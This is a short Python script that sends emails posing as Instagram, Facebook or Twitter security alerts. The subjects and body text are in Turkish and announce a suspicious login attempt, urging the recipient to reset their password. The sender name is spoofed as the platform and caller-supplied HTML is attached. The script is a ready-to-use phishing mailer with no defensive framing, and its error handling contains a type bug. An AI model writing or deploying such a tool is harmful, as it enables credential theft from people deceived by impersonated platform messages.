import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def send(sender_email, receiver_email, password, html_content, media):
    mediaSubjectContent = ""
    if media == "Instagram":
        mediaSubjectContent = "Instagram Şüpheli Giriş Denemesi"
    elif media == "Facebook":
        mediaSubjectContent = "Facebook Şüpheli Giriş Denemesi"
    elif media == "Twitter":
        mediaSubjectContent = "Twitter Şüpheli Giriş Denemesi"

    message = MIMEMultipart("alternative")
    message["Subject"] = mediaSubjectContent
    message["From"] = media
    message["To"] = media

    # Create the plain-text and HTML version of your message
    text = """Şupheli giriş tespit edildi lüteden şifrenizi yenileyin"""
    html = html_content
    part1 = MIMEText(text, "plain")
    part2 = MIMEText(html, "html")

    message.attach(part1)
    message.attach(part2)
    try:

        context = ssl.create_default_context()

        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(
                sender_email, receiver_email, message.as_string()
            )
    except smtplib.SMTPAuthenticationError as e:
        print(e+"hatalı giriş denemesi (mail adresi veya parola yanlış)")




#send(sender_email, receiver_email, password, html, media="Instagram")
